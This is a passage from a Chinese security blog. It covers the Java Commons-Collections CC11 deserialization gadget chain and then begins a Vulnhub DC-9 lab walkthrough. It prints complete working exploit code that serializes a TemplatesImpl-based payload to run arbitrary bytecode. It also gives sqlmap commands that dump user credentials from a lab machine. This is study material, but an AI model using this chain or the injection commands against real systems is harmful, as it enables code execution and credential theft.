class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        serialize(map);  </span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用这段代码的时候我们发现会直接序列化的时候会直接弹出计算器，这里其实和urldns链类似，这里在调试的又遇到了和我上次调试CC7的时候一样的问题如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108523.png" alt="image-20230715110839336"><br>最终没能解决，上次是因为过了一天再弄自己就好了，现在又是这样，哎，难搞<br>这里其实就是CC6中的问题，出在<code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>这条语句上，这里put方法也会调用到hash方法，但是我们需要的是putVal里面的hash方法对key进行计算所以就需要通过反射对put改值，让他不触发这条链然后再put完之后再反射改回来，最终的代码可以调试，但是没明白上面的为什么不可以？然后这里还有个问题就是put的时候会传入一个key反序列化无法进入if执行transform方法，所以需要删掉这个key<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108022.png" alt="image-20230715110851891"><br>最终的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        serialize(map);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="不带-Transformer-数组的-CC11-链子"><a href="#不带-Transformer-数组的-CC11-链子" class="headerlink" title="不带 Transformer 数组的 CC11 链子"></a>不带 Transformer 数组的 CC11 链子</h3><p>上面是带了Transformer数组的那么现在要去掉，LazyMap#get 的参数 key，会被传进transform()，实际上它可以扮演 ConstantTransformer 的角色—— 一个简单的对象传递者。<br>我们 LazyMap.get(key) 直接调用 InvokerTransfomer.transform(key)，然后像CC2那样调用 TempalteImpl.newTransformer() 来完成后续调用。即做如下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//替换为如下代码</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>再将后面几行的代码修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"> </span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">lazyMap.remove(templates);</span><br></pre></td></tr></table></figure><p>得到的最终 EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);    </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();   </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(templates);   </span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调试遇到了点问题，不知道那个代码为什么不能调，总的来说这条链子就是CC2的后半部分加CC6的前半部分稍微修改，没用到Transformer数组，对于后面的shiro学习做个铺垫</p><p>参考：<br>本文大都参考下面两篇博客<br><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/">Java反序列化Commons-Collections篇09-CC11链 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="http://zhuabapa.top/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/#bu-dai-transformer-shu-zu-de-cc-11-lian-zi">‘Java反序列化-cc11’ | zer0_c|imb’s blog (zhuabapa.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-9</title>
      <link href="/undefined/19947.html"/>
      <url>/undefined/19947.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9 ~ VulnHub</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156811.png" alt="image-20230710215518164"><br>端口开放<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156096.png" alt="image-20230710215632028"><br>访问页面，在search界面经过不断尝试确实存在注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156357.png" alt="image-20230710215648288"><br>丢进sqlmap看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157562.png" alt="image-20230710215708752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users --tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157055.png" alt="image-20230710215732019"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157804.png" alt="image-20230710215742063"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158323.png" alt="image-20230710215806259"><br>都是账号密码，然后去看看另一个库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158975.png" alt="image-20230710215817948"><br>出来两个表，这里选择先看Users表，中间不列出数据了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158221.png" alt="image-20230710215827174"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158899.png" alt="image-20230710215846860"><br>然后去登录，最终在如下位置找到文件包含<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159667.png" alt="image-20230710215902265"><br>在这里遇到一个新东西，以前没有碰到过<br><strong>knockd服务：即敲门端口服务，该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，，使系统开启需要访问的服务端口，才能对外访问，不使用时，再使用自定义序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性，它的默认配置文件是：&#x2F;etc&#x2F;knockd.conf</strong><br>那么去访问这个文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159278.png" 